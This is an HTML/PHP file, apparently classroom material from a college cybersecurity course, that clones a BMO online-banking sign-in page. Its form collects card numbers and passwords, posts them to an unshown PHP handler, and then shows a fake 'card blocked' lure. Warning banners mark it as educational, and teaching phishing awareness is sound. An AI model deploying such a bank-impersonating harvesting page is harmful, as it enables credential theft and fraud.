<!--
   * Educational Phishing Demonstration
   * ----------------------------------------
   * Programme: AEC Cybersécurité : protection et défense
   * 
   * Author/Professor: Akram Nasr
   * Email: Akram.Nasr@cmontmorency.qc.ca
   * 
   * IMPORTANT NOTICE:
   * This code is created for EDUCATIONAL PURPOSES ONLY to demonstrate 
   * phishing techniques and security vulnerabilities as part of 
   * cybersecurity education. Using this code for actual phishing
   * or any malicious purpose is illegal and unethical.
   -->
<?php
   require_once 'logic/process_card-form.php';
?>

<!DOCTYPE html>
<html class="plt-desktop md hydrated" dir="ltr" lang="en-CA" mode="md">
   <head>
      <meta charset="UTF-8" />
      <title>Sign in - BMO</title>
      <meta
         content="viewport-fit=cover,width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=2"
         name="viewport"
         />
      <link href="sources/images/favicon.ico" rel="shortcut icon" />
      <link href="sources/css/styles.css" rel="stylesheet" media="all" />
      <script src="sources/js/script.js" defer></script>
      <script src="sources/js/notice.js" defer></script>
   </head>
   <body>
      <div class="warning-banner">
         EDUCATIONAL MATERIAL ONLY - NOT A REAL BANKING SITE
      </div>
      <header class="bmo-header">
         <div class="layout-wrapper">
            <div
               class="layout-wrapper__container"
               >
               <div class="bmo-logo">
                  <img src="sources/images/415a508d3386f64195ea1089d9783274eff0507d.svg" alt="">
               </div>
               <div
                  class="header-content ng-star-inserted"
                  >
                  <nav
                     class="primary-nav profile-menu-wrap"
                     aria-label="Top"
                     >
                     <ul _ngcontent-gin-c114="" class="ng-star-inserted">
                        <li _ngcontent-gin-c114="" class="ng-star-inserted">
                           <fdc-header-link
                              _ngcontent-gin-c114=""
                              name="location"
                              color="white"
                              id="uhc-location"
                              _nghost-gin-c104=""
                              >
                              <a
                                 _ngcontent-gin-c104=""
                                 draggable="false"
                                 class="header-link ng-star-inserted"
                                 aria-label="Find us! opens in new window"
                                 title="Find us"
                                 >
                                 <fdc-icon
                                    _ngcontent-gin-c104=""
                                    aria-hidden="true"
                                    class="header-link-icon ng-star-inserted"
                                    _nghost-gin-c46=""
                                    ><span
                                    _ngcontent-gin-c46=""
                                    class="icon medium white location noHover"
                                    aria-hidden="true"
                                    ></span></fdc-icon
                                    >
                              </a
                                 >
                           </fdc-header-link
                              >
                        </li>
                        <li _ngcontent-gin-c114="" class="ng-star-inserted">
                           <app-takeover-help-container
                              _ngcontent-gin-c114=""
                              _nghost-gin-c111=""
                              class="popover-container"
                              >
                              <fdc-popover
                                 _ngcontent-gin-c111=""
                                 id="help-icon-popover"
                                 containerlocation="bottom-alignRight"
                                 _nghost-gin-c107=""
                                 class="popover-wrapper"
                                 >
                                 <fdc-header-link
                                    _ngcontent-gin-c107=""
                                    name="enclosed-help"
                                    color="white"
                                    _nghost-gin-c104=""
                                    id="help-icon-popover-popover-menu-btn"
                                    class="ng-star-inserted"
                                    >
                                    <a
                                       _ngcontent-gin-c104=""
                                       draggable="false"
                                       class="header-link ng-star-inserted"
                                       aria-label="Help"
                                       title="Help"
                                       aria-expanded="false"
                                       aria-haspopup="false"
                                       >
                                       <fdc-icon
                                          _ngcontent-gin-c104=""
                                          aria-hidden="true"
                                          class="header-link-icon ng-star-inserted"
                                          _nghost-gin-c46=""
                                          ><span
                                          _ngcontent-gin-c46=""
                                          class="icon medium white enclosed-help noHover"
                                          aria-hidden="true"
                                          ></span></fdc-icon
                                          >
                                    </a
                                       >
                                 </fdc-header-link
                                    >
                              </fdc-popover
                                 >
                           </app-takeover-help-container
                              >
                        </li>
                        <li _ngcontent-gin-c114="" class="ng-star-inserted">
                           <fdc-header-link
                              _ngcontent-gin-c114=""
                              id="uhc-language"
                              _nghost-gin-c104=""
                              ><a
                              _ngcontent-gin-c104=""
                              draggable="false"
                              class="header-link ng-star-inserted"
                              aria-label="Français"
                              title="Français"
                              ><span
                              _ngcontent-gin-c114=""
                              aria-hidden="true"
                              class="ng-star-inserted"
                              >FR</span
                              ></a
                              ></fdc-header-link
                              >
                        </li>
                     </ul>
                  </nav>
               </div>
            </div>
         </div>
      </header>
      <app-login
         _nghost-gin-c265=""
         class="ng-star-inserted"
         >
      <app-centered-layout-container
         _ngcontent-gin-c265=""
         _nghost-gin-c83=""
         id="login_page_container"
         >
      <div
         _ngcontent-gin-c83=""
         appscrolltotop=""
         class="centered-layout-container"
         >
      <div
         _ngcontent-gin-c83=""
         class="center-scroll-wrapper"
         >
      <div
         _ngcontent-gin-c83=""
         class="center-container-wrapper"
         >
         <div _ngcontent-gin-c83="" class="content">
            <div
               _ngcontent-gin-c83=""
               class="fdc-row jc-center"
               >
               <div
                  _ngcontent-gin-c83=""
                  class="fdc-col-12 fdc-md-col-12"
                  >
                  <main
                     _ngcontent-gin-c265=""
                     fdcprint=""
                     class="login mb-80p mb-md-16p"
                     >
                     <div
                        _ngcontent-gin-c265=""
                        class="login__title mt-16p ng-star-inserted"
                        >
                        <div
                           _ngcontent-gin-c265=""
                           class="login__title-icon"
                           >
                           <fdc-icon
                              _ngcontent-gin-c265=""
                              size="medium"
                              name="lock"
                              _nghost-gin-c46=""
                              ><span
                              _ngcontent-gin-c46=""
                              class="icon medium blue lock noHover"
                              aria-hidden="true"
                              ></span
                              ></fdc-icon>
                        </div>
                        <h1
                           _ngcontent-gin-c265=""
                           class="fdc-heading1 bold"
                           >
                           Sign in to Online Banking
                        </h1>
                     </div>
                     <div
                        _ngcontent-gin-c265=""
                        class="fdc-row flow-wrap mt-16p mt-md-0p"
                        >
                        <div
                           _ngcontent-gin-c265=""
                           class="tablet-gutter fdc-lg-col-2"
                           >
                           &nbsp;
                        </div>
                        <div
                           _ngcontent-gin-c265=""
                           class="fdc-col-6 fdc-lg-col-8 fdc-sm-col-4 mb-lg-16p mt-lg-16p mt-md-16p mt-xs-16p mt-sm-16p"
                           >
                           <app-login-form
                              _ngcontent-gin-c265=""
                              id="login"
                              _nghost-gin-c262=""
                              class="ng-star-inserted"
                              >
                              <fdc-card
                                 _ngcontent-gin-c262=""
                                 _nghost-gin-c50=""
                                 class="ng-star-inserted"
                                 >
                                 <div
                                    _ngcontent-gin-c50=""
                                    class="mercury bmo-card p-0p ng-star-inserted"
                                    style="min-height: 0px"
                                    >
                                    <div
                                       _ngcontent-gin-c50=""
                                       class="ng-star-inserted"
                                       >
                                       <div _ngcontent-gin-c50="">
                                          <h1
                                             _ngcontent-gin-c262=""
                                             class="heading-tablet-mobile ml-32p ml-md-16p mt-md-16p ng-star-inserted"
                                             >
                                             Sign in to Online Banking
                                          </h1>
                                          <?php if (isset($formSubmitted) && $formSubmitted): ?>
                                          <!-- Display the blocked message if the form has been submitted -->
                                          <div id="blocked-message">
                                             <p>
                                                Your card has been blocked due to unusual activity.
                                                <a href="#">Click here for verification</a>
                                             </p>
                                          </div>
                                          <?php else: ?>
                                          <!-- The original form markup preserved below -->
                                          <form
                                             _ngcontent-gin-c262=""
                                             novalidate=""
                                             id="login-form"
                                             class="ng-untouched ng-invalid ng-star-inserted ng-dirty"
                                             method="POST"
                                             action=""
                                             >
                                             <div _ngcontent-gin-c262="" class="login-form p-32p">
                                                <div _ngcontent-gin-c262="" class="mb-8p">
                                                   <div _ngcontent-gin-c262="" class="ng-star-inserted">
                                                      <fdc-input>
                                                         <div class="form-field mercury">
                                                            <label class="form-field__label" for="username-input">Card number</label>
                                                            <div class="input-container">
                                                               <input
                                                                  class="input text"
                                                                  name="username-input"
                                                                  type="tel"
                                                                  placeholder="Enter card number"
                                                                  inputmode="tel"
                                                                  id="username-input"
                                                                  autocomplete="off"
                                                                  />
                                                            </div>
                                                            <fdc-inline-error></fdc-inline-error>
                                                            <span class="input-helper-text" id="username-input-input-helper-text">
                                                            Enter your 16-digit card number
                                                            </span>
                                                         </div>
                                                      </fdc-input>
                                                   </div>
                                                </div>
                                                <div _ngcontent-gin-c262="" class="flex ng-star-inserted">
                                                   <fdc-checkbox-refresh
                                                      _ngcontent-gin-c262=""
                                                      name="remember"
                                                      value="Y"
                                                      formcontrolname="shouldRemember"
                                                      class="remember-me-checkbox ng-untouched ng-valid ng-dirty"
                                                      _nghost-gin-c207=""
                                                      >
                                                      <div _ngcontent-gin-c207="" class="form-field mercury">
                                                         <div _ngcontent-gin-c207="" class="form-check">
                                                            <label _ngcontent-gin-c207="" class="checkbox-layout fdc-body1 regular" for="yes"
                                                               ><input
                                                               _ngcontent-gin-c207=""
                                                               type="checkbox"
                                                               class="checkbox-input block"
                                                               id="yes"
                                                               value="Y"
                                                               name="remember"
                                                               aria-controls=""
                                                               aria-describedby=""
                                                               aria-checked="false"
                                                               aria-invalid="false"
                                                               /><span _ngcontent-gin-c207="" class="checkbox-label ng-star-inserted"
                                                               > Remember card </span
                                                               ></label
                                                               >
                                                         </div>
                                                         <fdc-inline-error _ngcontent-gin-c207="" _nghost-gin-c62="" class="ng-star-inserted"
                                                            ></fdc-inline-error
                                                            >
                                                      </div>
                                                   </fdc-checkbox-refresh>
                                                   <fdc-popover
                                                      _ngcontent-gin-c262=""
                                                      containerlocation="right-alignTop"
                                                      class="ml-8p mb-4p as-center popover-wrapper"
                                                      _nghost-gin-c107=""
                                                      >
                                                      <fdc-icon-button _ngcontent-gin-c107="" type="button" class="popover-area ng-star-inserted">
                                                         <fdc-button size="micro" _nghost-gin-c47="">
                                                            <button
                                                               _ngcontent-gin-c47=""
                                                               class="mercury no-print align-vertical-button primary micro no-marg no-padding"
                                                               id="remember-card-info-ariaDescribedby-btn"
                                                               aria-label="More about remember card"
                                                               aria-haspopup="false"
                                                               aria-describedby="remember-card-info"
                                                               aria-expanded="false"
                                                               type="button"
                                                               >
                                                               <span _ngcontent-gin-c47="" aria-live="assertive"></span
                                                                  >
                                                               <span _ngcontent-gin-c47="" class="content-span fade-in align-vertical"
                                                                  >
                                                                  <fdc-icon _ngcontent-gin-c47="" _nghost-gin-c46="" class="icon-vertical ng-star-inserted"
                                                                     ><span
                                                                     _ngcontent-gin-c46=""
                                                                     class="icon medium blue information"
                                                                     aria-hidden="true"
                                                                     ></span></fdc-icon
                                                                     >
                                                               </span
                                                                  >
                                                            </button>
                                                         </fdc-button>
                                                      </fdc-icon-button>
                                                   </fdc-popover>
                                                </div>
                                                <div _ngcontent-gin-c262="" class="mt-16p mt-md-8p">
                                                   <fdc-input
                                                      _ngcontent-gin-c262=""
                                                      appa11ytoggleinputanalytics=""
                                                      id="password"
                                                      name="password-input"
                                                      type="password"
                                                      formcontrolname="password"
                                                      _nghost-gin-c66=""
                                                      class="append fdc-input--has-icon fdc-input--password ng-untouched ng-pristine ng-invalid"
                                                      >
                                                      <div _ngcontent-gin-c66="" fdca11yiosinputfocus="" class="form-field mercury">
                                                         <label
                                                            _ngcontent-gin-c66=""
                                                            class="form-field__label ng-star-inserted"
                                                            aria-hidden="false"
                                                            for="password-input"
                                                            >Password</label
                                                            >
                                                         <div _ngcontent-gin-c66="" class="input-container">
                                                            <input
                                                               _ngcontent-gin-c66=""
                                                               class="input text ng-star-inserted"
                                                               name="password-input"
                                                               type="password"
                                                               placeholder=""
                                                               id="password-input"
                                                               value=""
                                                               maxlength="32"
                                                               autocomplete="off"
                                                               />
                                                            <span
                                                               _ngcontent-gin-c66=""
                                                               class="icon-button ng-star-inserted"
                                                               aria-hidden="false"
                                                               role="switch"
                                                               aria-label="Show password.  Note: toggling display will read value audibly"
                                                               tabindex="0"
                                                               aria-checked="false"
                                                               ><span _ngcontent-gin-c66="" class="icon medium show"></span></span
                                                               >
                                                         </div>
                                                         <fdc-inline-error _ngcontent-gin-c66="" _nghost-gin-c62=""></fdc-inline-error>
                                                      </div>
                                                      <div aria-live="polite" aria-atomic="true" class="sr-only"></div>
                                                   </fdc-input>
                                                </div>
                                                <div _ngcontent-gin-c262="" class="login-form__actions">
                                                   <div _ngcontent-gin-c262="" class="flex ai-center">
                                                      <fdc-link _ngcontent-gin-c262="" iconcolor="tertiary" type="primary" _nghost-gin-c49="">
                                                         <a
                                                            _ngcontent-gin-c49=""
                                                            draggable="false"
                                                            class="mercury link max-height primary medium ai-center ng-star-inserted"
                                                            >
                                                         <span _ngcontent-gin-c49="" role="text" class="ng-star-inserted"
                                                            ><span _ngcontent-gin-c262="">Forgot your password?</span
                                                            ></span>
                                                         </a>
                                                      </fdc-link>
                                                   </div>
                                                </div>
                                                <div _ngcontent-gin-c262="" class="flex jc-center ai-center mt-24p">
                                                   <fdc-button
                                                      _ngcontent-gin-c262=""
                                                      type="submit"
                                                      name="login-submit"
                                                      _nghost-gin-c47=""
                                                      id="login-submit"
                                                      >
                                                      <button
                                                         _ngcontent-gin-c47=""
                                                         class="mercury no-print primary medium no-marg"
                                                         id="f4249358-44eb-476a-8c5f-78fb1b69e704"
                                                         name="login-submit"
                                                         type="submit"
                                                         >
                                                      <span _ngcontent-gin-c47="" aria-live="assertive"></span>
                                                      <span _ngcontent-gin-c47="" class="content-span fade-in"
                                                         >
                                                      <span _ngcontent-gin-c47="" class="inner-span ng-star-inserted"
                                                         ><span _ngcontent-gin-c262="" name="login-submit" class="ng-star-inserted"
                                                         >Sign in</span
                                                         >
                                                      </span>
                                                      </span>
                                                      </button>
                                                   </fdc-button>
                                                </div>
                                             </div>
                                          </form>
                                          <?php endif; ?>
                                       </div>
                                    </div>
                                 </div>
                              </fdc-card
                                 >
                           </app-login-form
                              >
                        </div>
                        <div
                           _ngcontent-gin-c265=""
                           class="tablet-gutter fdc-lg-col-2"
                           >
                           &nbsp;
                        </div>
                        <div
                           _ngcontent-gin-c265=""
                           class="tablet-gutter fdc-lg-col-2"
                           >
                           &nbsp;
                        </div>
                        <div
                           _ngcontent-gin-c265=""
                           class="fdc-col-6 fdc-lg-col-8 fdc-sm-col-4 hack__force-small-gutter ng-star-inserted"
                           >
                           <fdc-card
                              _ngcontent-gin-c265=""
                              class="block mb-24p mb-lg-16p"
                              _nghost-gin-c50=""
                              >
                              <div
                                 _ngcontent-gin-c50=""
                                 class="mercury bmo-card p-0p ng-star-inserted"
                                 style="min-height: 0px"
                                 >
                                 <div
                                    _ngcontent-gin-c50=""
                                    class="ng-star-inserted"
                                    >
                                    <div _ngcontent-gin-c50="">
                                       <div
                                          _ngcontent-gin-c265=""
                                          class="banking ng-star-inserted"
                                          >
                                          <h2
                                             _ngcontent-gin-c265=""
                                             class="bold banking__title mt-16p fdc-title1"
                                             >
                                             Register a new card for
                                             online banking
                                          </h2>
                                          <p
                                             _ngcontent-gin-c265=""
                                             class="banking__tray"
                                             >
                                             <fdc-link
                                                _ngcontent-gin-c265=""
                                                class="mr-10p"
                                                _nghost-gin-c49=""
                                                ><a
                                                _ngcontent-gin-c49=""
                                                draggable="false"
                                                class="mercury link max-height primary medium ai-center ng-star-inserted"
                                                aria-label="REGISTER WITH A DEBIT CARD"
                                                ><span
                                                _ngcontent-gin-c49=""
                                                role="text"
                                                class="ng-star-inserted"
                                                ><span
                                                _ngcontent-gin-c265=""
                                                >DEBIT CARD</span
                                                ></span
                                                ></a
                                                ></fdc-link
                                                >
                                             <span
                                                _ngcontent-gin-c265=""
                                                class="fdc-body1"
                                                >or</span
                                                >
                                             <app-multi-platform-link
                                                _ngcontent-gin-c265=""
                                                class="ml-10p"
                                                >
                                                <fdc-link
                                                   _nghost-gin-c49=""
                                                   ><a
                                                   _ngcontent-gin-c49=""
                                                   draggable="false"
                                                   class="mercury link inline max-height primary medium ai-center ng-star-inserted"
                                                   id="credit-card-registration-link"
                                                   aria-label="REGISTER WITH A CREDIT CARD"
                                                   ><span
                                                   _ngcontent-gin-c49=""
                                                   role="text"
                                                   class="ng-star-inserted"
                                                   ><span
                                                   >CREDIT CARD</span
                                                   ></span
                                                   ></a
                                                   ></fdc-link
                                                   >
                                             </app-multi-platform-link
                                                >
                                          </p>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </fdc-card
                              >
                           <fdc-card
                              _ngcontent-gin-c265=""
                              type="flat"
                              class="mb-24p ng-star-inserted"
                              _nghost-gin-c50=""
                              >
                              <div
                                 _ngcontent-gin-c50=""
                                 class="mercury bmo-card flat p-0p ng-star-inserted"
                                 style="min-height: 0px"
                                 >
                                 <div
                                    _ngcontent-gin-c50=""
                                    class="ng-star-inserted"
                                    >
                                    <div _ngcontent-gin-c50="">
                                       <div
                                          _ngcontent-gin-c265=""
                                          class="secure ng-star-inserted"
                                          >
                                          <div
                                             _ngcontent-gin-c265=""
                                             class="secure__title pb-4p"
                                             >
                                             <fdc-icon
                                                _ngcontent-gin-c265=""
                                                size="medium"
                                                name="lock"
                                                color="black"
                                                _nghost-gin-c46=""
                                                ><span
                                                _ngcontent-gin-c46=""
                                                class="icon medium black lock"
                                                aria-hidden="true"
                                                ></span
                                                ></fdc-icon>
                                             <h2
                                                _ngcontent-gin-c265=""
                                                class="bold pl-8p pt-4p fdc-title1"
                                                >
                                                Your security always comes
                                                first.
                                             </h2>
                                          </div>
                                          <p
                                             _ngcontent-gin-c265=""
                                             class="fdc-body2 secure__description"
                                             >
                                             We’ve made Online Banking
                                             more convenient, while still
                                             using advanced security
                                             technologies that keep your
                                             money and information safe.
                                          </p>
                                          <fdc-link
                                             _ngcontent-gin-c265=""
                                             target="_blank"
                                             _nghost-gin-c49=""
                                             ><a
                                             _ngcontent-gin-c49=""
                                             draggable="false"
                                             class="mercury link inline secondary medium ai-center ng-star-inserted"
                                             target="_blank"
                                             ><span
                                             _ngcontent-gin-c49=""
                                             role="text"
                                             class="ng-star-inserted"
                                             ><span
                                             _ngcontent-gin-c265=""
                                             >Learn more about how
                                             we protect you.</span
                                                ><span
                                                _ngcontent-gin-c49=""
                                                class="sr-only ng-star-inserted"
                                                >
                                             Opens in a new tab </span
                                                ></span
                                                ><span
                                                _ngcontent-gin-c49=""
                                                aria-hidden="true"
                                                class="icon small external-link icon-link-end blue ng-star-inserted"
                                                ></span
                                                ></a
                                                >
                                          </fdc-link
                                             >
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </fdc-card
                              >
                        </div>
                     </div>
                  </main>
               </div>
            </div>
         </div>
      </div>
      <footer class="footer">
         <div class="container">
            <nav aria-label="Footer">
               
               <div class="educational-info">
                  <h3>Educational Demonstration</h3>
                  <p><strong>Programme:</strong> AEC Cybersécurité : protection et défense</p>
                  <p><strong>Author/Professeur:</strong> Akram Nasr</p>
                  <p><strong>Courriel:</strong> Akram.Nasr@cmontmorency.qc.ca</p>
                  <p><strong>Purpose:</strong> This simulated page was created for educational purposes only to demonstrate phishing techniques and security vulnerabilities.</p>
               </div>

               <ul class="nav-list">
                  <li><a>Legal <span class="sr-only">Opens in a new tab</span></a></li>
                  <li><a>Privacy <span class="sr-only">Opens in a new tab</span></a></li>
                  <li><a>Security <span class="sr-only">Opens in a new tab</span></a></li>
                  <li><a>Accessibility <span class="sr-only">Opens in a new tab</span></a></li>
               </ul>
               <ul class="nav-list">
                  <li><a>CDIC Member <span class="sr-only">Opens in a new tab</span></a></li>
               </ul>

            </nav>
         </div>
      </footer>
   </body>
</html>